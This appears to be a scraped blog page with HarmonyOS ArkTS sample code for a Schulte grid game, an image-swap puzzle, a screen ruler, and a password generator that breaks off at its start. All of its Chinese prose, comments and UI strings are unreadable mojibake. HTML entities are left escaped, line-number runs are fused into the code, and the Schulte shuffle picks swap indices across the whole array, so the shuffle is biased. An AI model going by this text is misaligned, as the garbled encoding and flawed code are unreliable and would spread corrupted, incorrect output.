ä¿æŒæ­£ç¡®çš„å§¿åŠ¿ï¼Œç¡®ä¿å…‰çº¿å……è¶³ã€‚çœ¼ç›ä¸çº¸é¢ä¿æŒé€‚å½“è·ç¦»ï¼Œä¸€èˆ¬ä¸º30-40å˜ç±³ã€‚å°½é‡ä¸è¦ç”¨æ‰‹æŒ‡ç›´æ¥æŒ‡ç€æ•°å­—ï¼Œä»¥é”»ç‚¼çœ¼ç›çš„ç§»åŠ¨èƒ½åŠ›ã€‚éšç€ç†Ÿç»ƒç¨‹åº¦çš„æé«˜ï¼Œå¯ä»¥å°è¯•æ›´å¤æ‚æˆ–æ›´å¤§çš„æ–¹æ ¼ï¼Œæ¯”å¦‚6x6æˆ–7x7ã€‚å®šæœŸç»ƒä¹ ï¼Œä½†ä¹Ÿè¦æ³¨æ„ä¼‘æ¯ï¼Œé¿å…è¿‡åº¦ç–²åŠ³ã€‚èˆ’å°”ç‰¹æ–¹æ ¼ä¸ä»…æ˜¯ä¸€ä¸ªç®€å•çš„æ¸¸æˆï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå®ç”¨çš„è®¤çŸ¥è®­ç»ƒå·¥å…·ï¼Œå¯¹äºæ”¹å–„æ³¨æ„åŠ›é›†ä¸­åº¦å’Œä¸ªäººæ•ˆç‡æœ‰ç€ç§¯æçš„ä½œç”¨ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; @Entry@Componentstruct Index &#123; @State numbers: number[] = []; @State currentIndex: number = 0; //ç”¨äºåˆ¤æ–­ç”¨æˆ·ç‚¹å‡»æ˜¯å¦æ­£ç¡® @State timeStart: number = 0; @State widthItem: number = 120 @State marginItem: number = 5 // åˆå§‹åŒ–èˆ’å°”ç‰¹æ–¹æ ¼ initGrid() &#123; this.numbers = [] for (let i = 0; i &lt; 25; i++) &#123; this.numbers.push(i + 1) &#125; this.shuffleArray(JSON.parse(JSON.stringify(this.numbers))); this.currentIndex = 0; this.timeStart = Date.now() &#125; // éšæœºæ‰“ä¹±æ•°ç»„ shuffleArray(array: number[]) &#123; for (let i = array.length - 1; i &gt; 0; i--) &#123; const j = Math.floor(Math.random() * 25); let temp = array[i] array[i] = array[j] array[j] = temp &#125; this.numbers = array &#125; // åˆ¤æ–­æ˜¯å¦å®Œæˆ isCompleted() &#123; return this.currentIndex === 25; &#125; build() &#123; Column(&#123; space: 20 &#125;) &#123; Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.numbers, (item: number, index: number) =&gt; &#123; Text(`$&#123;item&#125;`) .width(`$&#123;this.widthItem&#125;lpx`) .height(`$&#123;this.widthItem&#125;lpx`) .margin(`$&#123;this.marginItem&#125;lpx`) .fontSize(`$&#123;this.widthItem/2&#125;lpx`) .textAlign(TextAlign.Center) .backgroundColor(Color.Orange) .fontColor(Color.White) .borderRadius(5) .visibility(item &lt;= this.currentIndex ? Visibility.Hidden : Visibility.Visible) .onClick(() =&gt; &#123; if (this.numbers[index] === this.currentIndex + 1) &#123; this.currentIndex++; if (this.isCompleted()) &#123; console.info(&#x27;å®Œæˆï¼&#x27;); promptAction.showDialog(&#123; title: `ç”¨æ—¶`, message: `$&#123;((Date.now() - this.timeStart) / 1000).toFixed(3)&#125;ç§’`, buttons: [ &#123; text: &#x27;é‡æ–°å¼€å§‹&#x27;, color: &#x27;#ffa500&#x27; &#125; ], &#125;).then(()=&gt;&#123; this.initGrid(); &#125;) &#125; &#125; else &#123; console.info(&#x27;é”™è¯¯çš„é¡ºåºï¼&#x27;); &#125; &#125;) &#125;) &#125; .width(`$&#123;(this.widthItem + this.marginItem * 2) * 5&#125;lpx`) .height(`$&#123;(this.widthItem + this.marginItem * 2) * 5&#125;lpx`) // å¼€å§‹æŒ‰é’® Button(&#x27;å¼€å§‹&#x27;) .width(&#x27;50%&#x27;) .height(&#x27;10%&#x27;) .onClick(() =&gt; &#123; this.initGrid(); console.info(&#x27;æ¸¸æˆå¼€å§‹&#x27;); &#125;); &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) &#125;&#125; Pieceæ‹¼å›¾ ç®—æ³•ï¼š éšæœº å‰ªè£ äº¤æ¢ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186import &#123; fileIo as fs &#125; from &#x27;@kit.CoreFileKit&#x27;;import &#123; common &#125; from &#x27;@kit.AbilityKit&#x27;;import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;;import &#123; image &#125; from &#x27;@kit.ImageKit&#x27;;import &#123; photoAccessHelper &#125; from &#x27;@kit.MediaLibraryKit&#x27;; // å®šä¹‰æ‹¼å›¾ç»„ä»¶æ¥å£interface PuzzlePiece &#123; // æ‹¼å›¾å—çš„åƒç´ åœ°å›¾ pixelMap: image.PixelMap; // åŸå§‹å›¾ç‰‡ä¸­çš„ç´¢å¼•ä½ç½® originalIndex: number;&#125; // ä½¿ç”¨è£…é¥°å™¨å®šä¹‰é¡µé¢ç»„ä»¶@Entry@Componentstruct Page30 &#123; // çŠ¶æ€å˜é‡ï¼šé€‰ä¸­å›¾ç‰‡çš„URI @State selectedImageUrl: string = &#x27;&#x27;; // çŠ¶æ€å˜é‡ï¼šåŸå§‹å›¾ç‰‡çš„URI @State originalImageUrl: string = &#x27;&#x27;; // çŠ¶æ€å˜é‡ï¼šå­˜å‚¨æ‹¼å›¾å—çš„æ•°ç»„ @State puzzlePieces: Array&lt;PuzzlePiece&gt; = []; // çŠ¶æ€å˜é‡ï¼šè®°å½•å½“å‰é€‰ä¸­çš„æ‹¼å›¾å—ç´¢å¼• @State selectedPiece: number = -1; // å¼¹å‡ºå›¾ç‰‡é€‰æ‹©å™¨æ–¹æ³• async openPicker() &#123; try &#123; let PhotoSelectOptions = new photoAccessHelper.PhotoSelectOptions(); PhotoSelectOptions.MIMEType = photoAccessHelper.PhotoViewMIMETypes.IMAGE_TYPE; PhotoSelectOptions.maxSelectNumber = 1; let photoPicker = new photoAccessHelper.PhotoViewPicker(); let uris: photoAccessHelper.PhotoSelectResult = await photoPicker.select(PhotoSelectOptions) if (!uris || uris.photoUris.length === 0) return; // è·å–é€‰ä¸­å›¾ç‰‡çš„ç¬¬ä¸€å¼ URI let uri: string = uris.photoUris[0]; // æ‰“å¼€æ–‡ä»¶è¯»å–æµ let file = fs.openSync(uri, fs.OpenMode.READ_ONLY); // è·å–å½“å‰ä¸Šä¸‹æ–‡ let context = getContext(this) as common.UIAbilityContext; // æ–°å»ºä¸€ä¸ªä¿å­˜è£å‰ªåå›¾ç‰‡çš„è·¯å¾„ let newUrl = context.filesDir + &#x27;/test&#x27; + new Date().getTime() + &#x27;.jpg&#x27;; // å¤åˆ¶å›¾ç‰‡åˆ°æ–°çš„è·¯å¾„ fs.copyFileSync(file.fd, newUrl); // å…³é—­æ–‡ä»¶è¯»å–æµ fs.closeSync(file); // æ›´æ–°çŠ¶æ€å˜é‡ï¼šè®¾ç½®æ˜¾ç¤ºå›¾ç‰‡çš„URI this.selectedImageUrl = newUrl; // æ›´æ–°çŠ¶æ€å˜é‡ï¼šä¿å­˜åŸå§‹å›¾ç‰‡çš„URI this.originalImageUrl = uri; // å›¾ç‰‡æ›´æ”¹æ—¶è§¦å‘çš„æ–¹æ³• this.imgChange(); &#125; catch (e) &#123; console.error(&#x27;openPicker&#x27;, JSON.stringify(e)); &#125; &#125; // å›¾ç‰‡æ›´æ”¹å¤„ç†æ–¹æ³• async imgChange() &#123; try &#123; // åˆ›å»ºå›¾ç‰‡æºå¯¹è±¡ const imageSource: image.ImageSource = image.createImageSource(this.selectedImageUrl); // å›¾ç‰‡è§£ç é€‰é¡¹ let decodingOptions: image.DecodingOptions = &#123; editable: true, desiredPixelFormat: 3, &#125;; // åˆ›å»ºåƒç´ åœ°å›¾ let mPixelMap: image.PixelMap = await imageSource.createPixelMap(decodingOptions); // è·å–å›¾ç‰‡ä¿¡æ¯ let mImageInfo: image.ImageInfo = await mPixelMap.getImageInfo(); // è®¡ç®—æ¯ä¸ªæ‹¼å›¾å—çš„å¤§å° const pieceSize: image.Size = &#123; width: mImageInfo.size.width / 3, height: mImageInfo.size.height / 3, &#125;; // æ¸…ç©ºå·²æœ‰æ‹¼å›¾å—æ•°æ® this.puzzlePieces.splice(0); // éå†å›¾ç‰‡ç”Ÿæˆ9ä¸ªæ‹¼å›¾å— let count = 0; for (let row = 0; row &lt; 3; row++) &#123; for (let col = 0; col &lt; 3; col++) &#123; // åˆ›å»ºåŸºäºåŸå›¾çš„æ–°å›¾ç‰‡æº const imageSource = image.createImageSource(this.selectedImageUrl); // åˆ›å»ºæ–°åƒç´ åœ°å›¾ let mPixelMap = await imageSource.createPixelMap(decodingOptions); // è®¡ç®—è£å‰ªåŒºåŸŸ const cutRegion: image.Region = &#123; x: col * pieceSize.width, y: row * pieceSize.height, size: pieceSize, &#125;; // è£å‰ªåƒç´ åœ°å›¾ await mPixelMap.crop(cutRegion); // åˆ›å»ºå¹¶æ·»åŠ æ‹¼å›¾å—è‡³æ•°ç»„ const piece: PuzzlePiece = &#123; pixelMap: mPixelMap, originalIndex: count++, &#125;; this.puzzlePieces.push(piece); &#125; &#125; // æ‰“ä¹±æ‹¼å›¾å—é¡ºåº for (let i = this.puzzlePieces.length - 1; i &gt; 0; i--) &#123; const j = Math.floor(Math.random() * (i + 1)); let temp: PuzzlePiece = this.puzzlePieces[i]; this.puzzlePieces[i] = this.puzzlePieces[j]; this.puzzlePieces[j] = temp; &#125; &#125; catch (e) &#123; console.error(&#x27;imgChange&#x27;, JSON.stringify(e)); &#125; &#125; // æ„å»ºUIç•Œé¢ build() &#123; Column() &#123; // æ·»åŠ é€‰æ‹©å›¾ç‰‡æŒ‰é’®ï¼Œç‚¹å‡»åè°ƒç”¨æ‰“å¼€å›¾ç‰‡é€‰æ‹©å™¨æ–¹æ³• Button(&#x27;é€‰æ‹©å›¾ç‰‡â†’&#x27;).onClick(() =&gt; &#123; this.openPicker(); &#125;); // æ˜¾ç¤ºåŸå§‹å›¾ç‰‡ï¼ˆå¦‚æœå·²é€‰æ‹©ï¼‰ if (this.originalImageUrl) &#123; Text(&#x27;åŸå§‹å›¾ç‰‡â†“&#x27;); Image(this.originalImageUrl) .width(&#x27;180lpx&#x27;) .height(&#x27;180lpx&#x27;) .objectFit(ImageFit.Contain); &#125; // å¦‚æœæœ‰æ‹¼å›¾å—ï¼Œåˆ™æ˜¾ç¤ºæ¸¸æˆåŒº if (this.puzzlePieces.length &gt; 0) &#123; Text(&#x27;æ¸¸æˆå›¾ç‰‡â†“&#x27;); // æ¸¸æˆåŒºåŸŸé‡‡ç”¨ç½‘æ ¼å¸ƒå±€ Grid() &#123; // éå†æ‰€æœ‰æ‹¼å›¾å—å¹¶åˆ›å»ºç½‘æ ¼é¡¹ ForEach(this.puzzlePieces, (item: PuzzlePiece, index: number) =&gt; &#123; GridItem() &#123; // æ˜¾ç¤ºæ‹¼å›¾å—å›¾åƒ Image(item.pixelMap) .width(&#x27;200lpx&#x27;) .height(&#x27;200lpx&#x27;) .margin(&#x27;5lpx&#x27;) // æ ¹æ®æ˜¯å¦é€‰ä¸­è°ƒæ•´ç¼©æ”¾æ¯”ä¾‹ .scale(this.selectedPiece == index ? &#123; x: 0.5, y: 0.5 &#125; : &#123; x: 1, y: 1 &#125;) // æ·»åŠ ç‚¹å‡»äº‹ä»¶å¤„ç† .onClick(() =&gt; &#123; // å¤„ç†æ‹¼å›¾äº¤æ¢é€»è¾‘ if (this.selectedPiece == -1) &#123; this.selectedPiece = index; &#125; else if (this.selectedPiece == index) &#123; this.selectedPiece = -1; &#125; else &#123; let temp: PuzzlePiece = this.puzzlePieces[this.selectedPiece]; this.puzzlePieces[this.selectedPiece] = this.puzzlePieces[index]; this.puzzlePieces[index] = temp; this.selectedPiece = -1; // æ£€æŸ¥æ‹¼å›¾æ˜¯å¦å®Œæˆ let isSucc: boolean = true; for (let i = 0; i &lt; this.puzzlePieces.length; i++) &#123; console.info(&#x27;====item&#x27;, this.puzzlePieces[i].originalIndex, i); if (this.puzzlePieces[i].originalIndex !== i) &#123; isSucc = false; break; &#125; &#125; // å¦‚æœæ‹¼å›¾å®Œæˆï¼Œå¼¹å‡ºæç¤ºå¯¹è¯æ¡† if (isSucc) &#123; promptAction.showDialog(&#123; message: &#x27;æ‹¼å›¾å®Œæˆï¼&#x27;, &#125;); &#125; &#125; &#125;); &#125; &#125;) // End of ForEach &#125; // End of Grid .backgroundColor(&quot;#fafafa&quot;); // è®¾ç½®ç½‘æ ¼èƒŒæ™¯è‰² &#125; &#125; // End of Column .width(&#x27;100%&#x27;); // è®¾ç½®åˆ—å®½åº¦ä¸º100% &#125;&#125; rulerç›´å°º 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208import &#123; window &#125; from &#x27;@kit.ArkUI&#x27;; // å¯¼å…¥çª—å£ç›¸å…³çš„APIimport &#123; deviceInfo &#125; from &#x27;@kit.BasicServicesKit&#x27;; // å¯¼å…¥è®¾å¤‡ä¿¡æ¯ç›¸å…³çš„API // å®šä¹‰ç›´å°ºçº¿ç±»class RulerLine &#123; index: number; // çº¿çš„ç´¢å¼• height: number; // çº¿çš„é«˜åº¦ constructor(index: number, height: number) &#123; this.index = index; // åˆå§‹åŒ–ç´¢å¼• this.height = height; // åˆå§‹åŒ–é«˜åº¦ &#125; // æ˜¾ç¤ºçº¿çš„ç¼–å· showNumber(): string &#123; return this.index % 10 === 0 ? `$&#123;Math.floor(this.index / 10)&#125;` : &#x27;&#x27;; // æ¯10ä¸ªçº¿æ˜¾ç¤ºä¸€ä¸ªç¼–å· &#125;&#125; // æ‰©å±•æ–‡æœ¬æ ·å¼@Extend(Text)function fancy() &#123; .fontColor(&quot;#019dfe&quot;) // è®¾ç½®å­—ä½“é¢œè‰² .fontSize(20); // è®¾ç½®å­—ä½“å¤§å°&#125; // å®šä¹‰ç›´å°ºç»„ä»¶@Entry@Componentstruct RulerComponent &#123; @State maxRulerHeight: number = 0; // æœ€å¤§ç›´å°ºé«˜åº¦ @State @Watch(&#x27;onCellWidthChanged&#x27;) cellWidthInPixels: number = 17.28; // æ¯æ¯«ç±³å¯¹åº”çš„åƒç´  @State textWidth: number = 80; // æ–‡æœ¬å®½åº¦ @State rulerLines: RulerLine[] = []; // ç›´å°ºçº¿æ•°ç»„ @State leftOffsetX: number = -300; // å·¦ä¾§åç§» @State currentPositionX: number = -300; // å½“å‰Xä½ç½® @State @Watch(&#x27;onContainerHeightChanged&#x27;) containerHeight: number = 53; // å®¹å™¨é«˜åº¦ @State originalContainerHeight: number = 53; // åŸå§‹å®¹å™¨é«˜åº¦ @State @Watch(&#x27;onCellWidthChanged&#x27;) containerWidth: number = 0; // å®¹å™¨å®½åº¦ // å¤„ç†å•å…ƒæ ¼å®½åº¦å˜åŒ– onCellWidthChanged() &#123; this.maxRulerHeight = vp2px(this.containerWidth) / this.cellWidthInPixels / 10; // æ›´æ–°æœ€å¤§ç›´å°ºé«˜åº¦ &#125; // å¤„ç†å®¹å™¨é«˜åº¦å˜åŒ– onContainerHeightChanged() &#123; this.containerHeight = Math.max(this.containerHeight, 53); // ç¡®ä¿å®¹å™¨é«˜åº¦ä¸å°äº53 &#125; // ç»„ä»¶å³å°†å‡ºç°æ—¶ aboutToAppear(): void &#123; // è®¾ç½®å½“å‰åº”ç”¨ä¸ºæ¨ªå±æ˜¾ç¤º window.getLastWindow(getContext()).then((windowClass) =&gt; &#123; windowClass.setPreferredOrientation(window.Orientation.LANDSCAPE); // è®¾ç½®ä¸ºæ¨ªå± &#125;); // åˆå§‹åŒ–ç›´å°ºçº¿ for (let i = 0; i &lt;= 15 * 10; i++) &#123; let lineHeight: number = (i % 10 === 0) ? 90 : (i % 5 === 0) ? 60 : 45; // æ ¹æ®ç´¢å¼•è®¾ç½®çº¿çš„é«˜åº¦ this.rulerLines.push(new RulerLine(i, lineHeight)); // å°†æ–°çº¿æ·»åŠ åˆ°æ•°ç»„ä¸­ &#125; &#125; // æ„å»ºUI build() &#123; Column() &#123; // åˆ›å»ºä¸€ä¸ªåˆ—å¸ƒå±€ Stack() &#123; // åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€ Stack() &#123; // åˆ›å»ºå¦ä¸€ä¸ªå †å å¸ƒå±€ ForEach(this.rulerLines, (line: RulerLine, index: number) =&gt; &#123; // éå†ç›´å°ºçº¿æ•°ç»„ Line()// åˆ›å»ºä¸€æ¡çº¿ .width(1)// è®¾ç½®çº¿å®½ .height(`$&#123;line.height&#125;px`)// è®¾ç½®çº¿é«˜ .backgroundColor(Color.White)// è®¾ç½®çº¿çš„èƒŒæ™¯é¢œè‰² .margin(&#123; left: `$&#123;this.cellWidthInPixels * index&#125;px` &#125;); // è®¾ç½®çº¿çš„å·¦è¾¹è· Text(line.showNumber())// æ˜¾ç¤ºçº¿çš„ç¼–å· .fontColor(Color.White)// è®¾ç½®å­—ä½“é¢œè‰² .fontSize(18)// è®¾ç½®å­—ä½“å¤§å° .width(`$&#123;this.textWidth&#125;px`)// è®¾ç½®æ–‡æœ¬å®½åº¦ .height(`$&#123;this.textWidth&#125;px`)// è®¾ç½®æ–‡æœ¬é«˜åº¦ .textAlign(TextAlign.Center)// è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼ .margin(&#123; left: `$&#123;this.cellWidthInPixels * index - this.textWidth / 2&#125;px`, top: `$&#123;line.height&#125;px` &#125;); // è®¾ç½®æ–‡æœ¬ä½ç½® &#125;); &#125;.width(&#x27;100%&#x27;).height(&#x27;100%&#x27;).align(Alignment.TopStart); // è®¾ç½®å †å å¸ƒå±€çš„å®½é«˜å’Œå¯¹é½æ–¹å¼ Column(&#123; space: 15 &#125;) &#123; // åˆ›å»ºä¸€ä¸ªåˆ—å¸ƒå±€ï¼Œè®¾ç½®é—´è· Text(`å½“å‰è®¾å¤‡ï¼š$&#123;deviceInfo.marketName&#125;`).fancy(); // æ˜¾ç¤ºå½“å‰è®¾å¤‡åç§° Counter() &#123; // åˆ›å»ºä¸€ä¸ªè®¡æ•°å™¨ Text(`é€‰ä¸­åŒºè·ç¦»ï¼š$&#123;this.maxRulerHeight.toFixed(2)&#125;å˜ç±³`).fancy(); // æ˜¾ç¤ºé€‰ä¸­åŒºè·ç¦» &#125; .foregroundColor(Color.White) // è®¾ç½®è®¡æ•°å™¨å­—ä½“é¢œè‰² .width(300) // è®¾ç½®è®¡æ•°å™¨å®½åº¦ .onInc(() =&gt; &#123; // å¢åŠ è®¡æ•°å™¨æ—¶çš„å¤„ç† this.containerHeight = px2vp(vp2px(this.containerHeight) + this.cellWidthInPixels / 10); // æ›´æ–°å®¹å™¨é«˜åº¦ &#125;) .onDec(() =&gt; &#123; // å‡å°‘è®¡æ•°å™¨æ—¶çš„å¤„ç† this.containerHeight = px2vp(vp2px(this.containerHeight) - this.cellWidthInPixels / 10); // æ›´æ–°å®¹å™¨é«˜åº¦ &#125;); Counter() &#123; // åˆ›å»ºå¦ä¸€ä¸ªè®¡æ•°å™¨ Text(`æ¯æ¯«ç±³é—´è·ï¼š$&#123;this.cellWidthInPixels.toFixed(2)&#125;px`).fancy(); // æ˜¾ç¤ºæ¯æ¯«ç±³é—´è· &#125; .foregroundColor(Color.White) // è®¾ç½®è®¡æ•°å™¨å­—ä½“é¢œè‰² .width(300) // è®¾ç½®è®¡æ•°å™¨å®½åº¦ .onInc(() =&gt; &#123; // å¢åŠ è®¡æ•°å™¨æ—¶çš„å¤„ç† this.cellWidthInPixels += 0.01; // å¢åŠ æ¯æ¯«ç±³é—´è· &#125;) .onDec(() =&gt; &#123; // å‡å°‘è®¡æ•°å™¨æ—¶çš„å¤„ç† this.cellWidthInPixels = Math.max(0.01, this.cellWidthInPixels - 0.01); // å‡å°‘æ¯æ¯«ç±³é—´è·ï¼Œç¡®ä¿ä¸å°äº0.01 &#125;); &#125; RelativeContainer() &#123; // åˆ›å»ºä¸€ä¸ªç›¸å¯¹å¸ƒå±€å®¹å™¨ Rect()// åˆ›å»ºä¸€ä¸ªçŸ©å½¢ .fill(&quot;#80019dfe&quot;)// è®¾ç½®å¡«å……é¢œè‰² .borderColor(&quot;#019dfe&quot;)// è®¾ç½®è¾¹æ¡†é¢œè‰² .borderWidth(&#123; left: 1, right: 1 &#125;)// è®¾ç½®è¾¹æ¡†å®½åº¦ .clip(true)// å¯ç”¨è£å‰ª .width(&quot;100%&quot;)// è®¾ç½®å®½åº¦ä¸º100% .height(&quot;100%&quot;)// è®¾ç½®é«˜åº¦ä¸º100% .onAreaChange((oldArea: Area, newArea: Area) =&gt; &#123; // å¤„ç†åŒºåŸŸå˜åŒ– this.containerWidth = newArea.width as number; // æ›´æ–°å®¹å™¨å®½åº¦ &#125;); Stack() &#123; // åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€ Circle(&#123; height: 30, width: 30 &#125;)// åˆ›å»ºä¸€ä¸ªåœ†å½¢ .fill(&quot;#019dfe&quot;)// è®¾ç½®å¡«å……é¢œè‰² .stroke(Color.Transparent)// è®¾ç½®è¾¹æ¡†é¢œè‰²ä¸ºé€æ˜ .strokeWidth(3); // è®¾ç½®è¾¹æ¡†å®½åº¦ Circle(&#123; height: 40, width: 40 &#125;)// åˆ›å»ºå¦ä¸€ä¸ªåœ†å½¢ .fill(Color.Transparent)// è®¾ç½®å¡«å……é¢œè‰²ä¸ºé€æ˜ .stroke(&quot;#019dfe&quot;)// è®¾ç½®è¾¹æ¡†é¢œè‰² .strokeWidth(3); // è®¾ç½®è¾¹æ¡†å®½åº¦ &#125; .hitTestBehavior(HitTestMode.Block) // è®¾ç½®ç¢°æ’æ£€æµ‹è¡Œä¸º .padding(20) // è®¾ç½®å†…è¾¹è· .alignRules(&#123; // è®¾ç½®å¯¹é½è§„åˆ™ center: &#123; anchor: &quot;__container__&quot;, align: VerticalAlign.Center &#125;, // å‚ç›´å±…ä¸­ middle: &#123; anchor: &quot;__container__&quot;, align: HorizontalAlign.Start &#125; // å·¦å¯¹é½ &#125;) .gesture(PanGesture(&#123; // å·¦ä¾§æ‹–åŠ¨æ‰‹åŠ¿ fingers: 1, // å•æŒ‡æ‹–åŠ¨ direction: PanDirection.Horizontal, // æ°´å¹³æ‹–åŠ¨ distance: 1 // æœ€å°æ‹–åŠ¨è·ç¦» &#125;).onActionUpdate((event: GestureEvent) =&gt; &#123; // æ‹–åŠ¨æ›´æ–°æ—¶çš„å¤„ç† this.leftOffsetX = this.currentPositionX + event.offsetX / 2; // æ›´æ–°å·¦ä¾§åç§» this.containerHeight = this.originalContainerHeight - event.offsetX; // æ›´æ–°å®¹å™¨é«˜åº¦ &#125;).onActionEnd(() =&gt; &#123; // æ‹–åŠ¨ç»“æŸæ—¶çš„å¤„ç† this.currentPositionX = this.leftOffsetX; // æ›´æ–°ä½ç½® this.originalContainerHeight = this.containerHeight; // æ›´æ–°åŸå§‹é«˜åº¦ &#125;)); Stack() &#123; // åˆ›å»ºå¦ä¸€ä¸ªå †å å¸ƒå±€ Circle(&#123; height: 30, width: 30 &#125;)// åˆ›å»ºä¸€ä¸ªåœ†å½¢ .fill(&quot;#019dfe&quot;)// è®¾ç½®å¡«å……é¢œè‰² .stroke(Color.Transparent)// è®¾ç½®è¾¹æ¡†é¢œè‰²ä¸ºé€æ˜ .strokeWidth(3); // è®¾ç½®è¾¹æ¡†å®½åº¦ Circle(&#123; height: 40, width: 40 &#125;)// åˆ›å»ºå¦ä¸€ä¸ªåœ† .fill(Color.Transparent)// è®¾ç½®å¡«å……é¢œè‰²ä¸ºé€æ˜ .stroke(&quot;#019dfe&quot;)// è®¾ç½®è¾¹æ¡†é¢œè‰² .strokeWidth(3); // è®¾ç½®è¾¹æ¡†å®½åº¦ &#125; .hitTestBehavior(HitTestMode.Block) // è®¾ç½®ç¢°æ’æ£€æµ‹è¡Œä¸º .padding(20) // è®¾ç½®å†…è¾¹è· .alignRules(&#123; // è®¾ç½®å¯¹é½è§„åˆ™ center: &#123; anchor: &quot;__container__&quot;, align: VerticalAlign.Center &#125;, // å‚ç›´å±…ä¸­ middle: &#123; anchor: &quot;__container__&quot;, align: HorizontalAlign.End &#125; // å³å¯¹é½ &#125;) .gesture(PanGesture(&#123; // å³ä¾§æ‹–åŠ¨æ‰‹åŠ¿ fingers: 1, // å•æŒ‡æ‹–åŠ¨ direction: PanDirection.Horizontal, // æ°´å¹³æ‹–åŠ¨ distance: 1 // æœ€å°æ‹–åŠ¨è·ç¦» &#125;).onActionUpdate((event: GestureEvent) =&gt; &#123; // æ‹–åŠ¨æ›´æ–°æ—¶çš„å¤„ç† this.leftOffsetX = this.currentPositionX + event.offsetX / 2; // æ›´æ–°å·¦ä¾§åç§» this.containerHeight = this.originalContainerHeight + event.offsetX; // æ›´æ–°å®¹å™¨é«˜åº¦ &#125;).onActionEnd(() =&gt; &#123; // æ‹–åŠ¨ç»“æŸæ—¶çš„å¤„ç† this.currentPositionX = this.leftOffsetX; // æ›´æ–°ä½ç½® this.originalContainerHeight = this.containerHeight; // æ›´æ–°åŸå§‹é«˜åº¦ &#125;)); &#125; .width(this.containerHeight) // è®¾ç½®å®½åº¦ .height(&quot;100%&quot;) // è®¾ç½®é«˜åº¦ .translate(&#123; x: this.leftOffsetX &#125;) // ä½¿ç”¨å·¦ä¾§åç§» .gesture(PanGesture(&#123; // å·¦ä¾§æ‹–åŠ¨æ‰‹åŠ¿ fingers: 1, // å•æŒ‡æ‹–åŠ¨ direction: PanDirection.Horizontal, // æ°´å¹³æ‹–åŠ¨ distance: 1 // æœ€å°æ‹–åŠ¨è·ç¦» &#125;).onActionUpdate((event: GestureEvent) =&gt; &#123; // æ‹–åŠ¨æ›´æ–°æ—¶çš„å¤„ç† if (event) &#123; this.leftOffsetX = this.currentPositionX + event.offsetX; // æ›´æ–°å·¦ä¾§åç§» &#125; &#125;).onActionEnd(() =&gt; &#123; // æ‹–åŠ¨ç»“æŸæ—¶çš„å¤„ç† this.currentPositionX = this.leftOffsetX; // æ›´æ–°ä½ç½® &#125;)); &#125; &#125;.height(&#x27;100%&#x27;).width(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦å’Œå®½åº¦ .padding(&#123; left: 30, right: 10 &#125;) // è®¾ç½®å†…è¾¹è· .backgroundColor(&quot;#181b22&quot;); // è®¾ç½®èƒŒæ™¯é¢œè‰² &#125;&#125; randon passwordéšæœºå¯†ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263// å¯¼å…¥å‰ªè´´æ¿æœåŠ¡import &#123; pasteboard &#125; from &#x27;@kit.BasicServicesKit&#x27;;// å¯¼å…¥å¼¹çª—æç¤ºæœåŠ¡import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; // ä½¿ç”¨è£…é¥°å™¨å®šä¹‰ä¸€ä¸ªå¯è§‚å¯Ÿçš„ç±»ï¼Œç”¨äºå¯†ç é€‰é¡¹@ObservedV2class PasswordOption &#123; name: string; // é€‰é¡¹åç§° characters: string; // è¯¥é€‰é¡¹å¯¹åº”çš„å­—ç¬¦é›† // å®šä¹‰æ˜¯å¦é€‰ä¸­ï¼Œé»˜è®¤ä¸ºtrue @Trace selected: boolean = true; // å®šä¹‰æ˜¯å¦å¯ç”¨ï¼Œé»˜è®¤ä¸ºtrue @Trace enabled: boolean = true; // æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–nameå’Œcharacters constructor(name: string, characters: string) &#123; this.name = name; this.characters = characters; &#125;&#125; // ä½¿ç”¨è£…é¥°å™¨å®šä¹‰ä¸€ä¸ªå…¥å£ç»„ä»¶@Entry@Componentstruct PasswordGeneratorPage &#123; // å®šä¹‰å¯†ç é€‰é¡¹æ•°ç»„ @State options: PasswordOption[] = [ new PasswordOption(&quot;å¤§å†™å­—æ¯&quot;, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;), new PasswordOption(&quot;å°å†™å­—æ¯&quot;, &quot;abcdefghijklmnopqrstuvwxyz&quot;), new PasswordOption(&quot;æ•°å­—&quot;, &quot;0123456789&quot;), new PasswordOption(&quot;ç‰¹æ®Šå­—ç¬¦&quot;, &quot;!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?&quot;), ]; // å®šä¹‰å¯†ç é•¿åº¦çŠ¶æ€ï¼Œé»˜è®¤å€¼ä¸º10 @State passwordLength: number = 10; // åŸºç¡€é—´è· @State baseSpacing: number = 30; // ç”Ÿæˆçš„å¯†ç  @State generatedPassword: string = &#x27;&#x27;; // æ˜¯å¦å¯ç”¨å¤åˆ¶æŒ‰é’® @State isCopyButtonEnabled: boolean = false; // ä¸»é¢˜è‰² @State primaryColor: string = &#x27;#71dec7&#x27;; // 